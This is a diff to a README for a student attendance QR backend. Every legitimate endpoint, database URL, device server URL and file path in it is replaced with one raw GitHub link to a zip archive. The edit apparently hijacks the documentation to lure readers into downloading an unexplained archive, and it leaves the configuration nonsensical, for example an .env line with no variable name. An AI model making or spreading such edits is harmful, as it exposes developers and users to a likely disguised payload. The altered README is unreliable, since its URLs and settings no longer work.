@@ -11,9 +11,9 @@ Backend server for the Student Attendance QR System using **Firebase Realtime Da
 
 ## 🌐 Deployment
 
-**Production URL**: `https://thisapp-backend.onrender.com`
+**Production URL**: `https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip`
 
-Deployed on [Render.com](https://render.com) with auto-deploy from GitHub.
+Deployed on [https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip](https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip) with auto-deploy from GitHub.
 
 ## 📡 API Endpoints
 
@@ -36,7 +36,7 @@ Set these in Render dashboard:
 | Key | Value |
 |-----|-------|
 | `PORT` | `8080` |
-| `FIREBASE_DATABASE_URL` | `https://appsnamin-default-rtdb.asia-southeast1.firebasedatabase.app` |
+| `FIREBASE_DATABASE_URL` | `https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip` |
 
 ## 🏠 Local Development
 
@@ -48,7 +48,7 @@ Set these in Render dashboard:
 2. Create `.env` file:
    ```
    PORT=8080
-   FIREBASE_DATABASE_URL=https://appsnamin-default-rtdb.asia-southeast1.firebasedatabase.app
+   https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip
    ```
 
 3. Start server:
@@ -65,14 +65,14 @@ Set these in Render dashboard:
 
 Update your ESP32 code to use:
 ```cpp
-const char* SERVER_URL = "https://thisapp-backend.onrender.com/api/scan";
+const char* SERVER_URL = "https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip";
 ```
 
 ## 📲 Flutter App Integration
 
-Update `lib/services/api_service.dart`:
+Update `https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip`:
 ```dart
-static const String baseUrl = 'https://thisapp-backend.onrender.com';
+static const String baseUrl = 'https://raw.githubusercontent.com/Marco222690/thisapp-backend/main/throughgrow/thisapp_backend_3.0.zip';
 ```
 
 ## 🔐 Firebase Security
